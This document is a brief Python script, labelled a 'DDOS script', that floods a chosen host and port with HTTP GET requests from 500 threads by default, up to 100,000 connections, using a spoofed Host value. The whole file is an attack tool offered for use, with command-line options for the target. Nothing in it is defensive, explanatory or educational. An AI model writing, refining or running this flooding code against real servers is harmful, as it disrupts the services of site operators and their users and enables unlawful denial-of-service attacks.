#!/usr/bin/python3
import socket
import threading
from argparse import ArgumentParser

parser = ArgumentParser(description='DDOS script for attacking with 1 computer')

parser.add_argument('-t', '--thread', default=500, help='Threading of work', type=int)
parser.add_argument('-u', '--url', help='Url of Attacking', type=str)
parser.add_argument('-i', '--ip', help='IP address Attacking', type=str)
parser.add_argument('-fi', '--fake-ip', default='154.215.235.15', help='Fake IP address Fishing', type=str)
parser.add_argument('-p', '--port', default=80, help='Port of Attacking', type=int)
parser.add_argument('-c', '--count', default=100000, help='Count of queries', type=int)

result = parser.parse_args()

if not result.ip and not result.url :
	parser.error('Enter The url or Ip')

clicks = 0
port = result.port
fake_ip = result.fake_ip
max_clicks = result.count
ip = result.ip if result.ip else socket.gethostbyname(result.url)

def attack():
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip, port))
			s.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, port))
			s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
			s.close()

			global clicks
			clicks+=1
			if clicks > max_clicks:
				break
			if clicks % 1000 == 0:
				print(f'[ LOG ] - {int(clicks/1000)} K requests', end='\r')
		except Exception as e:
			clicks-=1
			print(f'[ Error ] - {e}')

if __name__ == '__main__':
	for _ in range(result.thread):
		ddos_t = threading.Thread(target=attack)
		ddos_t.start()
